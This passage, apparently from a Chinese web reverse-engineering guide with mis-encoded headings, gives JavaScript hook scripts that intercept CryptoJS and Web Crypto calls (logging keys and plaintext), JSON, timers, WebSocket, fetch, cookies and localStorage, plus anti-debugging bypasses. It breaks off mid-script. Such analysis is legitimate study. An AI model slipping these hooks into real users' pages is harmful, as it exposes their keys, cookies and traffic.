<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalAESDecrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">decrypt</span><span class="p">;</span>
<span class="w">        </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">decrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">ciphertext</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">cfg</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ”“ [CryptoJS.AES.decrypt]&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  Ciphertext:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">ciphertext</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  Key:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalAESDecrypt</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  Decrypted:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">));</span>
<span class="w">            </span><span class="k">debugger</span><span class="p">;</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">        </span><span class="p">};</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="hook-web-crypto-api">Hook Web Crypto API</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalSubtle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">subtle</span><span class="p">;</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">hookCryptoMethod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">methodName</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">original</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalSubtle</span><span class="p">[</span><span class="nx">methodName</span><span class="p">];</span>
<span class="w">        </span><span class="nx">originalSubtle</span><span class="p">[</span><span class="nx">methodName</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ” [crypto.subtle.</span><span class="si">${</span><span class="nx">methodName</span><span class="si">}</span><span class="sb">]`</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">original</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ” [crypto.subtle.</span><span class="si">${</span><span class="nx">methodName</span><span class="si">}</span><span class="sb">] Result:`</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">        </span><span class="p">};</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="nx">hookCryptoMethod</span><span class="p">(</span><span class="s1">&#39;encrypt&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">hookCryptoMethod</span><span class="p">(</span><span class="s1">&#39;decrypt&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">hookCryptoMethod</span><span class="p">(</span><span class="s1">&#39;sign&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">hookCryptoMethod</span><span class="p">(</span><span class="s1">&#39;verify&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">hookCryptoMethod</span><span class="p">(</span><span class="s1">&#39;digest&#39;</span><span class="p">);</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="json-hook">JSON Hook</h2>

      <h3 id="hook-jsonstringify">Hook JSON.stringify</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalStringify</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">;</span>

<span class="w">    </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="nx">replacer</span><span class="p">,</span><span class="w"> </span><span class="nx">space</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ“ [JSON.stringify] Input:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">obj</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">();</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalStringify</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ“ [JSON.stringify] Output:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="hook-jsonparse">Hook JSON.parse</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalParse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">;</span>

<span class="w">    </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">text</span><span class="p">,</span><span class="w"> </span><span class="nx">reviver</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ“– [JSON.parse] Input:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">text</span><span class="p">);</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalParse</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ“– [JSON.parse] Output:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å®šæ—¶å™¨-hook">å®šæ—¶å™¨ Hook</h2>

      <h3 id="hook-settimeout">Hook setTimeout</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalSetTimeout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">setTimeout</span><span class="p">;</span>

<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">setTimeout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">callback</span><span class="p">,</span><span class="w"> </span><span class="nx">delay</span><span class="p">,</span><span class="w"> </span><span class="p">...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`â° [setTimeout] Delay: </span><span class="si">${</span><span class="nx">delay</span><span class="si">}</span><span class="sb">ms`</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`â° [setTimeout] Callback:`</span><span class="p">,</span><span class="w"> </span><span class="nx">callback</span><span class="p">.</span><span class="nx">toString</span><span class="p">().</span><span class="nx">substring</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">100</span><span class="p">));</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">();</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalSetTimeout</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="hook-setinterval">Hook setInterval</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalSetInterval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">setInterval</span><span class="p">;</span>

<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">setInterval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">callback</span><span class="p">,</span><span class="w"> </span><span class="nx">delay</span><span class="p">,</span><span class="w"> </span><span class="p">...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`â° [setInterval] Interval: </span><span class="si">${</span><span class="nx">delay</span><span class="si">}</span><span class="sb">ms`</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`â° [setInterval] Callback:`</span><span class="p">,</span><span class="w"> </span><span class="nx">callback</span><span class="p">.</span><span class="nx">toString</span><span class="p">().</span><span class="nx">substring</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">100</span><span class="p">));</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalSetInterval</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="websocket-hook">WebSocket Hook</h2>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalWebSocket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">WebSocket</span><span class="p">;</span>

<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">WebSocket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="nx">protocols</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ”Œ [WebSocket] Connecting to: </span><span class="si">${</span><span class="nx">url</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">ws</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">originalWebSocket</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="nx">protocols</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// Hook send</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalSend</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">;</span>
<span class="w">        </span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ“¤ [WebSocket] Send:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">);</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">originalSend</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">        </span><span class="p">};</span>

<span class="w">        </span><span class="c1">// Hook onmessage</span>
<span class="w">        </span><span class="nx">ws</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ“¥ [WebSocket] Message:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="c1">// Hook onopen</span>
<span class="w">        </span><span class="nx">ws</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;open&#39;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;âœ… [WebSocket] Connected&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="c1">// Hook onerror</span>
<span class="w">        </span><span class="nx">ws</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;âŒ [WebSocket] Error:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">error</span><span class="p">);</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="c1">// Hook onclose</span>
<span class="w">        </span><span class="nx">ws</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;close&#39;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ”´ [WebSocket] Closed&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">ws</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="åè°ƒè¯•ç»•è¿‡">åè°ƒè¯•ç»•è¿‡</h2>

      <h3 id="ç»•è¿‡-debugger">ç»•è¿‡ debugger</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ–¹æ³•ä¸€ï¼šé‡å†™ Function.prototype.constructor</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalConstructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Function</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="kr">constructor</span><span class="p">;</span>

<span class="w">    </span><span class="nb">Function</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="kr">constructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// æ£€æŸ¥æ˜¯å¦åŒ…å« &#39;debugger&#39;</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="nx">args</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">];</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="ow">typeof</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;string&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;debugger&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸš« [Anti-Debug] Blocked debugger&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="c1">// è¿”å›ç©ºå‡½æ•°</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{};</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalConstructor</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>

<span class="c1">// æ–¹æ³•äºŒï¼šä½¿ç”¨ Chrome DevTools</span>
<span class="c1">// å³é”® debugger è¡Œ -&gt; &quot;Never pause here&quot;</span>
</code></pre>
      </div>

      <h3 id="hook-console-æ£€æµ‹ç»•è¿‡">Hook console æ£€æµ‹ç»•è¿‡</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// æŸäº›ç½‘ç«™é€šè¿‡æ£€æµ‹ console è¢«æ‰“å¼€æ¥åè°ƒè¯•</span>
<span class="w">    </span><span class="c1">// é‡å†™ console æ–¹æ³•è¿”å›å›ºå®šå€¼</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">noop</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{};</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalConsole</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">...</span><span class="nx">console</span><span class="w"> </span><span class="p">};</span>

<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">console</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">log</span><span class="o">:</span><span class="w"> </span><span class="nx">noop</span><span class="p">,</span>
<span class="w">        </span><span class="nx">debug</span><span class="o">:</span><span class="w"> </span><span class="nx">noop</span><span class="p">,</span>
<span class="w">        </span><span class="nx">info</span><span class="o">:</span><span class="w"> </span><span class="nx">noop</span><span class="p">,</span>
<span class="w">        </span><span class="nx">warn</span><span class="o">:</span><span class="w"> </span><span class="nx">noop</span><span class="p">,</span>
<span class="w">        </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="nx">noop</span><span class="p">,</span>
<span class="w">        </span><span class="c1">// ä¿ç•™åŸå§‹ console ä¾›æˆ‘ä»¬ä½¿ç”¨</span>
<span class="w">        </span><span class="nx">_original</span><span class="o">:</span><span class="w"> </span><span class="nx">originalConsole</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// ä½¿ç”¨ï¼šwindow.console._original.log(&#39;message&#39;);</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç»¼åˆ-hook-è„šæœ¬">ç»¼åˆ Hook è„šæœ¬</h2>

      <h3 id="ä¸€é”®ç›‘æ§æ‰€æœ‰å…³é”®-api">ä¸€é”®ç›‘æ§æ‰€æœ‰å…³é”® API</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ£ Universal Hook Script Loaded&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// 1. Network</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="p">;</span>
<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸŒ [Fetch]`</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">originalFetch</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">clone</span><span class="p">();</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">clone</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ“¥ [Fetch] Response:`</span><span class="p">,</span><span class="w"> </span><span class="nx">text</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">200</span><span class="p">));</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// 2. Cookie</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">cookieCache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
<span class="w">    </span><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nb">document</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;cookie&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">get</span><span class="o">:</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">(</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸª [Cookie] Read&#39;</span><span class="p">),</span><span class="w"> </span><span class="nx">cookieCache</span><span class="p">),</span>
<span class="w">        </span><span class="nx">set</span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="nx">v</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">(</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸª [Cookie] Write:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">v</span><span class="p">),</span><span class="w"> </span><span class="nx">cookieCache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">v</span><span class="p">,</span><span class="w"> </span><span class="nx">v</span><span class="p">)</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="c1">// 3. LocalStorage</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalSetItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">;</span>
<span class="w">    </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">k</span><span class="p">,</span><span class="w"> </span><span class="nx">v</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ’¾ [LocalStorage] </span><span class="si">${</span><span class="nx">k</span><span class="si">}</span><span class="sb"> = </span><span class="si">${</span><span class="nx">v</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalSetItem</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// 4. JSON</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalStringify</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">;</span>
<span class="w">    </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ“ [JSON.stringify]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">obj</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalStringify</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// 5. CryptoJS (å¦‚æœå­˜åœ¨)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">CryptoJS</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
